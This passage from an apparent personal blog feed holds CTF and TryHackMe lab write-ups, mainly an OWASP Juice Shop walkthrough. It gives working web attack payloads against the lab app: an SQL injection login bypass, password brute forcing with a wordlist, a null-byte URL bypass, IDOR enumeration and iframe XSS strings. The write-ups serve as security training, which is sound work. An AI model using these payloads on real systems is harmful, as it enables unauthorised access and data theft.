<p>One of the hints tells us that if you don&rsquo;t have access to a phone, you can also use <code>zbar-tools</code> to convert an image to text.</p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Verify</title>
      <link>http://localhost:1313/picoctf-verify/</link>
      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-verify/</guid>
      <description>Happy 4th of July
This is my first time experiencing picoCTF. I had heard of it numerous times on the Internet, and it turned out to be way more fun and engaging than I expected. I think I’ll stick to picoCTF for a while before moving on to HackTheBox, as I feel picoCTF provides more basic and foundational CTFs than HTB. Anyway, I&amp;rsquo;m really glad I stumbled upon this resource and decided to give it a try.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
<p><em>Happy 4th of July</em></p>
<p>This is my first time experiencing picoCTF. I had heard of it numerous times on the Internet, and it turned out to be way more fun and engaging than I expected. I think I’ll stick to picoCTF for a while before moving on to HackTheBox, as I feel picoCTF provides more basic and foundational CTFs than HTB. Anyway, I&rsquo;m really glad I stumbled upon this resource and decided to give it a try.</p>
<hr>
<h3 id="description">Description</h3>
<p>People keep trying to trick my players with imitation flags. I want to make sure they get the real thing! I&rsquo;m going to provide the SHA-256 hash and a decrypt script to help you know that my flags are legitimate.</p>
<hr>
<p>First we need to connect to SSH server by <code>ssh ctf-player@rhea.picoctf.net -p 61394</code></p>
<p>After you are logged into the server, type <code>ls</code> to check files and directories</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>ctf-player@pico-chall$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>checksum.txt  decrypt.sh  files</span></span></code></pre></div>
<br>
<p>Checksum
<code>3ad37ed6c5ab81d31e4c94ae611e0adf2e9e3e6bee55804ebc7f386283e366a4</code></p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>ctf-player@pico-chall$ ls files
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>0agQiFLS  3kS2W94N  92q4JPFx  CxDy3RIy  GodaoG3e  K9mG0gBB  OVCZKr6X  QNPhWoha  Tui6wJfr  WxflVQBr  Za4Oz6eg  cWvaGe5W  f3Oy21ek  jSNCdUA3  oRzmzVaf  st6t5Khc  wx3RfP7B
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>0pEkV2ds  3kYAjtIX  9EMX68VB  Cz1ZfreC  H3rLRpMi  KCi7EWrH  OX3IlkB9  QjJChAMg  TwspwefZ  X4s5LEFG  ZaN8BLaN  caGexAeh  f7v2BtXe  k2kklNHQ  oZ71cyGG  t0luWBy8  xzvNiQwK
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>0wWA41ot  3mKIltIv  9nlUSB5k  DHDt0q0q  HG1OKGnm  KV1QF2CV  OYpH5Rfs  RIjDMPzO  U14Ody2N  X8OIdwTY  ZfRDLvRe  cdLJdv1c  fKWz0UcF  k3AMdGoS  oaOPzO00  t3YK8diU  yOEWonka
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>0yVzp2am  3xjxuSOP  A0aXQwRy  DMo5tbhE  HPGHI002  KcHrhrZK  Opx3E3FO  RJZglp6X  U6YYQ3HK  XScpq1MB  ZgC80wUc  chaBbXpo  fWnAvkyW  k5aiuMj6  oeq8cWO4  tLG9HM3a  yajqgzPt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>12GUEFi0  49gLh1zo  AKEjqj8u  DNZBkTaH  HRSTilo9  KfXHVDto  Oq8kRa6b  RXCGKuwy  UKi454YR  XW7eedrJ  aDSBn4a7  ciYQtbBp  ffM4jxzv  kLFFhUci  orc2TmKb  uJzNSw96  ypsNLNOA
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>12R70dbh  49qfB01x  AeCM4Vvt  Di7h281J  HchfFzCW  L4oXILcc  OzUaGPJp  RZfcsWcw  UWQ5qeIb  XeegDb5b  aNhIds5X  coeqJdbu  ffw8WXYD  l4lFl66y  p2FLQhZe  uQyUDnOZ  ytd5LOm1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>1EQhRC4i  5p13qchp  AhVRy5sU  Dj2k48PL  HlVWXs9d  LCeIKlH5  P0zSZ01H  Ricc6Xgh  UiciI0Fr  XfZqFKg1  aWrHNgwY  covwBpER  fjdhIY2n  lUsUQJ4B  pyJ5KxZp  v6LGqmwI  yzqsPNuQ
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>1FjaHS3F  5r6mt5Iq  Aqg5GrWn  DqlYDm8h  HouNr2C0  LJckwIQl  PB3Mh3mc  RuvyhgVU  UinP1H13  XjZyXSLg  aXaKm8w8  cxKJcozU  ftNxaFsY  m2KQa1Hp  q12b9M6L  v8sVJPvD  zH4qslwZ
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>1cYEYb6L  6kPfytcD  BMBlGtHm  E5vU7ojc  I7V7Ju5A  LRXQ5oNw  PBh0NfB8  S9jVApXB  Ujaf2OwZ  XrAdESZl  b47rxTge  dINee6RV  gQQDt3TI  m5cOAhxS  q2yrfUO0  vCUbox39  zM5KAlbJ
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>1iXLQGXR  6rd0x1aK  BP14euwo  EAZMi0dM  IAiKRrWF  LqUvuW7o  PGQBY3gP  SA3xkV3Z  UzFFqfxa  XrvFYdDg  b7e3VlZ8  dS2gaUE4  gY52Y8t0  mVEKZ3oW  q7LqCtpM  vTgToTLG  zMQ1nXew
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>2hOQXHZC  6vYE68JA  BkMRgk48  EB06dS7k  INu5ULbd  M19EEXCb  PKjcfWRy  SXltVhZT  V2CZ7uY0  Xw38pYK0  bDlbvwh8  dVJ9IeAT  gZ9thrVF  mcjegRRr  q845iKih  vfN94Ek3  zWeRABcB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>2nsMaCTj  7U4dSToL  BoBiL395  EVjQlyVv  Ic0zhcYV  MKg0Y6X7  PUt9VRoX  SbFIvoSj  VHviUe6f  Xxuckerf  bIl1SDxK  dZVnOthw  hDyxnGKZ  n05ZtlwX  qRM9Cugo  vnr7vUto  zZe9EIdH
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>2zpsEiQJ  7cnZoSuo  BvplEv2R  EtzUMFMR  J75ycvyv  MwfNVxMB  Pf3zlSAC  SkQZlbB2  VUPouqTb  Y4u4wEGY  bf6qqi2j  dkV6p1DF  hKDw8Cwn  n7C2bpPk  qYpcbIbt  w63X3jh4  zhBiEB8c
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>363nnRwS  83NyszLP  CS66jcDI  FN4tlPPC  JBVTXHTa  MzdMfZHa  PtEdNKlH  TBQytfqs  Vj67lQyx  YCf9VpOR  blIGgzh7  dtc6oz6G  iRXqo85L  nDjOINiw  rQP8fnIe  wVXmJCep
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>3BrlDAbo  8Dw7QTA4  CXjlF1PS  FmmWrIZ7  JJxoEHaC  NFea6BFS  PwyKZRSq  TSJCXwIT  WBStW98P  YG1pCKDt  br8OM834  e018b574  imkWZwMa  nF6EHta6  rUOHrSvR  wj3JmMau
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>3PmKbHhH  8HwmtNGn  CaDiX4Hy  GhWI4eJh  JXT0M9Rt  NgY5gymg  PzU12rre  TTjLO7LQ  WET6cnvi  YPNiaCgG  brRmUfmD  e7irOvB1  j1RDffgK  niz3loOL  rfNEgD0l  wr59gSPm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>3ckGbZtx  8cSetvuU  Cdje4q5k  GkM1UPTw  Ji1SbY1i  NopiZGwa  Q5IWBGXV  ThekmVcy  Wh09BzOS  YdulsHwq  btZJHGWw  exGstYty  j5Tc1Z62  o0R9Vxk8  ruWv5GEU  wtPMeWzq
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>3eBHvesU  8sqe8FVs  CntNA8JK  GoGhbQto  K1clcP8Z  O2eRM15N  Q8eHpBL9  TqHFzH54  WrlAfM9p  YdxjMT1r  c3eE4Atp  exbu4azE  jNImYWHs  oGmnMVYP  rudfRBMm  wtq06VT7</span></span></code></pre></div>
<p>At this stage, what we gotta do is create a checksum of each file with <code>sha256sum</code> command and see if we get the matching checksum. In order to create checksum of all files in a directory we can do <code>sha256sum &lt;directory&gt;/*</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>ctf-player@pico-chall$ sha256sum files/* | grep <span style="color:#cba6f7">$(</span>cat checksum.txt<span style="color:#cba6f7">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>3ad37ed6c5ab81d31e4c94ae611e0adf2e9e3e6bee55804ebc7f386283e366a4  files/e018b574</span></span></code></pre></div>
<p>As we can see from the output above, we found a matching checksum in a file called <code>e018b574</code></p>
<p>Now we can decrypt the file by running <code>./decrypt.sh files/e018b574</code> command</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>ctf-player@pico-chall$ ./decrypt.sh files/e018b574
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>trust_but_verify_e018b574<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p>We got the flag!</p>
<p><strong><em>flag</em></strong>: <code>picoCTF{trust_but_verify_e018b574}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] OWASP Juice Shop</title>
      <link>http://localhost:1313/thm-owasp-juice-shop/</link>
      <pubDate>Wed, 03 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-owasp-juice-shop/</guid>
      <description>We will look at OWASP&amp;rsquo;s TOP 10 vulnerabilities in web applications. But for this, we will be looking at OWASP&amp;rsquo;s own creation, Juice Shop.
Question #1: What&amp;rsquo;s the Administrator&amp;rsquo;s email address? admin@juice-sh.op Question #2: What parameter is used for searching? q When I typed asdfsdf on the search bar, I noticed that the URL changed to http://10.10.113.37/#/search?q=asdfsdf. we can see that the parameter is q.
Question #3: What show does Jim reference in his review?</description>
      <content:encoded><![CDATA[<p>We will look at OWASP&rsquo;s TOP 10 vulnerabilities in web applications. But for this, we will be looking at OWASP&rsquo;s own creation, Juice Shop.</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="question-1-whats-the-administrators-email-address">Question #1: What&rsquo;s the Administrator&rsquo;s email address?</h4>






<pre tabindex="0"><code>admin@juice-sh.op</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="question-2-what-parameter-is-used-for-searching">Question #2: What parameter is used for searching?</h4>






<pre tabindex="0"><code>q</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>When I typed <code>asdfsdf</code> on the search bar, I noticed that the URL changed to <code>http://10.10.113.37/#/search?q=asdfsdf</code>. we can see that the parameter is <code>q</code>.</p>
<br>
<h4 id="question-3-what-show-does-jim-reference-in-his-review">Question #3: What show does Jim reference in his review?</h4>






<pre tabindex="0"><code>Star Trek</code></pre>
<p><img src="image-3.png#center" alt="alt text"></p>
<p>Jim did a review on the Green Smoothie product. We can see that he mentions a replicator. Replicator is a reference to a TV show called Star Trek.</p>
<br>
<h4 id="question-4-log-into-the-administrator-account">Question #4 Log into the administrator account!</h4>
<p><img src="image-4.png#center" alt="alt text">
On the login page, just type any credentials for Burpsuite to capture the request</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>POST /rest/user/login HTTP/1.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Host: 10.10.113.37
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>User-Agent: Mozilla/5.0 <span style="color:#89dceb;font-weight:bold">(</span>X11; Linux aarch64; rv:109.0<span style="color:#89dceb;font-weight:bold">)</span> Gecko/20100101 Firefox/115.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Accept: application/json, text/plain, */*
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Accept-Language: en-US,en;<span style="color:#f5e0dc">q</span><span style="color:#89dceb;font-weight:bold">=</span>0.5
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Accept-Encoding: gzip, deflate, br
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Content-Type: application/json
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Content-Length: <span style="color:#fab387">44</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Origin: http://10.10.113.37
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Connection: keep-alive
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Referer: http://10.10.113.37/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Cookie: <span style="color:#f5e0dc">io</span><span style="color:#89dceb;font-weight:bold">=</span>QdUYP1oidC2VzPTOAAAA; <span style="color:#f5e0dc">language</span><span style="color:#89dceb;font-weight:bold">=</span>en; <span style="color:#f5e0dc">cookieconsent_status</span><span style="color:#89dceb;font-weight:bold">=</span>dismiss
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">{</span><span style="color:#a6e3a1">&#34;email&#34;</span>:<span style="color:#a6e3a1">&#34;test@gmail.com&#34;</span>,<span style="color:#a6e3a1">&#34;password&#34;</span>:<span style="color:#a6e3a1">&#34;test&#34;</span><span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p>As you could see our request has been captured. Next, we are going to change the email value, <code>test@gmail.com</code> to <code>' or 1=1</code>. <code>{&quot;email&quot;:&quot;' or 1=1&quot;,&quot;password&quot;:&quot;test&quot;}</code></p>
<p>Here&rsquo;s how this works:</p>
<ol>
<li>The character <code>'</code> will close the brackets in the SQL query</li>
<li><code>OR</code> in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement becomes true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account.</li>
<li>The <code>--</code> character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment.</li>
</ol>
<p><img src="image-5.png#center" alt="alt text">
Send a request with the SQL injection code then you will be logged in as admin</p>
<br>
<h4 id="question-5-log-into-the-bender-account">Question 5: Log into the Bender account!</h4>






<pre tabindex="0"><code>fb364762a3c102b2db932069c0e6b78e738d4066</code></pre>
<p><img src="image-6.png#center" alt="alt text">
<img src="image-7.png#center" alt="alt text"></p>
<br>
<h4 id="question-6-bruteforce-the-administrator-accounts-password">Question 6: Bruteforce the Administrator account&rsquo;s password</h4>
<p>We have used SQL injection to log into the Administrator account but still do not know the password.
Once again capture a login request but this time send it to Intruder on Burpsuite.</p>
<p>Go to Positions and then select the <code>Clear § </code>. In the password field, place two <code>§</code> inside the quotes.
The <code>§§</code> is not two separate inputs but Burp&rsquo;s implementation of quotations.
<img src="image-8.png#center" alt="alt text">
<br></p>
<p>For the payload, we will be using the <code>best1050.txt from Seclists</code> for Bruteforce attack.
Seclists can be downloaded via <code>sudo apt-get install seclists</code>. Also, the list is located in <code>/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt</code>
<br></p>
<p><img src="image-9.png#center" alt="alt text"></p>
<p><img src="image-10.png#center" alt="alt text">
As we can see the status code is 200 for the payload, <code>admin123</code>
<br></p>
<p><img src="image-11.png#center" alt="alt text"></p>
<br>
<h4 id="question-7-reset-jims-password">Question 7: Reset Jim&rsquo;s Password</h4>
<p>When typed into the email field in the Forgot Password page, Jim&rsquo;s security question is set to <code>Your eldest siblings middle name?</code>
However, we already saw that Jim used a Star Trek reference with his review on a juice.</p>
<p><img src="image-12.png#center" alt="alt text"></p>
<br>
<p><img src="image-13.png#center#center" alt="alt text"></p>
<p>when googled &ldquo;Jim Star Trek&rdquo;, the fictional character&rsquo;s name is actually <code>James T. Kirk</code> and its eldest siblings middle name is <code>Samuel</code>
<img src="image-14.png#center#center" alt="alt text">
<img src="image-15.png#center" alt="alt text"></p>
<br>
<h4 id="question-8-access-the-confidential-document">Question 8: Access the Confidential Document!</h4>
<p><img src="image-16.png#center" alt="alt text"></p>
<p>on the bottom left, we can see that it links to <code>http://10.10.187.53/ft/legal.md</code>. Navigating to that <code>/ftp/</code> directory reveals that it is exposed to the public.</p>
<p><img src="image-17.png#center" alt="alt text"></p>
<p>Some of the files appear to be confidential. Download the files and go back to the homepage to receive the flag.</p>
<p><img src="image-18.png#center" alt="alt text">
<code>edf9281222395a1c5fee9b89e32175f1ccf50c5b</code></p>
<br>
<h4 id="question-9-log-into-mc-safesearchs-account">Question 9: Log into MC SafeSearch&rsquo;s account</h4>
<p>Watch the following video to get the password for MC Safe Search&rsquo;s account:
<a href="https://www.youtube.com/watch?v=v59CX2DiX0Y">Link</a></p>
<p>In his song, he mentions that his password is &ldquo;Mr. Noodles&rdquo; but he replaced some vowels into zeros. So, the password to the <em><a href="mailto:mc.safesearch@juice-sh.op">mc.safesearch@juice-sh.op</a></em> is &ldquo;<strong>Mr. N00dles</strong>.</p>
<p><code>66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0</code></p>
<br>
<h4 id="question-10-download-the-backup-file">Question 10: Download the Backup file!</h4>
<p>On http://10.10.176.53/ftp, when we try to download <code>package.json.bak</code> file, we encounter a 403 error saying that only .md and .pdf files can be downloaded.</p>
<p>To get around this, we can use a character bypass called <code>Poison Null Byte</code>.
A Poison Null Byte looks like this <code>$00</code></p>
<p>But because we are downloading it using the url, we will need to encode this into a url encoded format, which is <code>%2500</code>.</p>
<p>The number &ldquo;2500&rdquo; in the context of a &ldquo;Poison Null Byte&rdquo; is a result of URL encoding</p>
<p>A Poison Null Byte is actually a <code>NULL terminator</code>. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string.</p>
<p>The final url should look like this: <code>10.10.176.53/ftp/package.json.bak%2500.md</code></p>
<br>
<h4 id="question-11-access-the-administration-page">Question 11: Access the administration page</h4>
<p>Modern-day systems will allow for multiple users to have access to different pages. Administrators most commonly use an admin page to edit, add, and remove different elements of a website.</p>
<p>When <code>Broken Access Control</code> exploits or bugs are found, it will be categorized into one of two types:</p>
<ul>
<li>Horizontal Privilege Escalation</li>
<li>Vertical Privilege Escalation</li>
</ul>
<p>Look for a javascript file for <code>main-es2015.js</code> in Debugger on FireFox (or Sources on Chrome)</p>
<p><img src="image-19.png#center" alt="alt text"></p>
<p>This shows us that there&rsquo;s a path towards <code>/#/administration</code>, but going there while not logged in doesn&rsquo;t work. As this is an Administrator page, it makes sens that we need to be in the Admin account in order to view it.</p>
<br>
<p><img src="image-20.png#center" alt="alt text">
This image above is what we see when we logged in as admin and navigated to <code>/#/administration</code> page.</p>
<p><code>946a799363226a24822008503f5d1324536629a0</code></p>
<br>
<h4 id="question-12-view-another-users-shopping-basket">Question 12: View another user&rsquo;s shopping basket.</h4>
<p>Log into the Admin account and click on &lsquo;Your Basket&rsquo;. Make sure Burp is running so you can capture the request.</p>
<p><code>GET /rest/basket/1 HTTP/1.1</code></p>
<p>Change the number 1 after <code>/basket/</code> to 2</p>
<p><img src="image-21.png#center" alt="alt text"></p>
<p>It will show you the basket of User ID 2. You can do this for other User IDs as well</p>
<br>
<h4 id="question-13-remove-all-5-star-reviews">Question 13: Remove all 5-star reviews.</h4>
<p>Navigate back to <code>/#/administration</code> page and remove all the five-star review by clicking the bin icon.</p>
<p><img src="image-22.png#center" alt="alt text"></p>
<p><code>50c97bcce0b895e446d61c83a21df371ac2266ef</code></p>
<br>
<h4 id="question-14-perform-a-dom-xss">Question 14: Perform a DOM XSS!</h4>
<p>XSS or Cross-site scripting is a vulnerability that allows attackers to run javascript in web applications. Their complexity ranges from easy to extremely hard, as each web application parses the queries in a different way.</p>
<p>There are three major types of XSS attacks:</p>
<ol>
<li>DOM XSS</li>
<li>Persistent XSS</li>
<li>Reflected XSS</li>
</ol>
<p>We will be using the iframe element with a javascript alert tag:</p>
<p><code>&lt;iframe src=&quot;javascript:alert('xss')&quot;&gt;</code></p>
<p>It is common practice that the search bar will send a request to the server in which it will then send back the related information, but this is where the flaw lies. Without correct input sanitastion, we are able to perform an XSS attack against the search bar.</p>
<p><code>9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf</code></p>
<br>
<h4 id="question-15-perform-a-persistent-xss">Question 15: Perform a persistent XSS!</h4>
<p>First, log in to the <code>admin</code> account. We are going to navigate to the <code>Last Login IP</code> page for this attack.</p>
<p>The Last Login IP should say <code>0.0.0.0</code>
As it logs the &rsquo;last&rsquo; login IP, we will now logout so that it logs the &rsquo;new&rsquo; IP. Make sure that Burp intercept is on, so it will catch the logout request.</p>
<p><img src="image-23.png#center" alt="alt text"></p>
<p>After we catch the logout request, we will add a new header like the image above and forward the request to the server with the newly added header.</p>
<p>Then when signing back into the admin account and navigating to the Last Login IP page again, we will see the XSS alert.</p>
<p><img src="image-24.png#center" alt="alt text"></p>
<p><code>149aa8ce13d7a4a8a931472308e269c94dc5f156</code></p>
<br>
<h4 id="question-16-perform-a-reflected-xss">Question 16: Perform a reflected XSS!</h4>
<p>Login into the admin account and navigate to the &lsquo;Order History&rsquo; page.
From there you will see a &lsquo;Truck&rsquo; icon, clicking on that will bring you to the track result page. You will also see that there is an id paird with the order.</p>
<p><code>http://10.10.129.167/#/track-result?id=5267-b3f50aba1f1b9125</code></p>
<p>We will use the iframe XSS, <code>&lt;iframe src=&quot;javascript:alert('xss')&quot;</code>&gt;, in the place of the
<code>5267-b3f50aba1f1b9125</code></p>
<p>After submitting the URL, refresh the page and you will get an alert saying XSS.</p>
<p><img src="image-25.png#center" alt="alt text"></p>
<p><code>23cefee1527bde039295b2616eeb29e1edc660a0</code></p>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] OWASP Top 10 (2021)</title>
      <link>http://localhost:1313/thm-owasp-top-10/</link>
      <pubDate>Sun, 30 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-owasp-top-10/</guid>
      <description>What is OWASP? The Open Web Application Security Project, or OWASP, is an international non-profit organization dedicated to web application security. One of OWASP&amp;rsquo;s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.
What is OWASP Top 10? The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.</description>
      <content:encoded><![CDATA[<h3 id="what-is-owasp">What is OWASP?</h3>
<p>The <strong>Open Web Application Security Project, or OWASP</strong>, is an international non-profit organization dedicated to <strong>web application security</strong>. One of OWASP&rsquo;s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.</p>
<h3 id="what-is-owasp-top-10">What is OWASP Top 10?</h3>
<p><strong>The OWASP Top 10</strong> is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.</p>
<blockquote>
<ol>
<li>Broken Access Control</li>
<li>Cryptographic Failures</li>
<li>Injection</li>
<li>Insecure Design</li>
<li>Security Misconfiguration</li>
<li>Vulnerable and Outdated Components</li>
<li>Identification and Authentication Failures</li>
<li>Software and Data Integrity Failures</li>
<li>Security Logging &amp; Monitoring Failures</li>
<li>Server-Side Request Forgery (SSRF)</li>
</ol>
</blockquote>
<hr>
<h3 id="1-broken-access-control">1. Broken Access Control</h3>
<p>Websites usually have pages that are protected from regular visitors. For example, only the site&rsquo;s admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are <em>broken</em>.</p>
<h4 id="broken-access-control-idor-challenge">Broken Access Control (IDOR Challenge)</h4>
<p><strong>IDOR</strong> or <strong>Insecure Direct Object Reference</strong> refers to an access control vulnerability where you can access resources you wouldn&rsquo;t normally be able to see. This occurs when the programmer exposes a <strong>Direct Object Reference</strong>, which is just an identifier that refers to specific objects within the server. By object, it can refer to a file, a user, a bank account in a banking application, or anything.</p>
<br>
<p>Deploy the machine and go to <code>http://MACHINE_IP</code> - login with the username <em>noot</em> and the password <em>test1234</em>.</p>
<br>
Look at other user's notes. What is the flag?






<pre tabindex="0"><code>flag{fivefourthree}</code></pre>
<p><img src="image.png#center" alt="alt text"></p>






<pre tabindex="0"><code>http://10.10.255.211/note.php?note_id=0</code></pre>
<p><img src="image-1.png#center" alt="alt text">
changed the <strong>id</strong> in the url from 1 to 0 and revealed the flag.</p>
<h3 id="2-cryptographic-failures">2. Cryptographic Failures</h3>
<p>A <strong>cryptographic failure</strong> refers to any vulnerability arising from the misuse of cryptographic alogrithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.</p>
<h4 id="cryptographic-failures-challenge">Cryptographic Failures (Challenge)</h4>
